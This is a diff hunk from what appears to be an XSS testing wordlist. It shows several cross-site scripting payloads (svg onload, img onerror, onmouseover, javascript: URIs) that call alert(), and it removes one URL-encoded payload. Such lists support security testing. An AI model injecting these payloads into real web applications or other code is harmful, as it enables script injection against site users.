@@ -147,7 +147,7 @@ veris-->group<svg/onload=alert(/XSS/)//
 #"><img src=M onerror=alert('XSS');>
 element[attribute='<img src=x onerror=alert('XSS');>
 [<blockquote cite="]">[" onmouseover="alert('RVRSH3LL_XSS');" ]
-%22;alert%28%27RVRSH3LL_XSS%29//
+
 javascript:alert%281%29;
 <w contenteditable id=x onfocus=alert()>
 alert;pg("XSS")
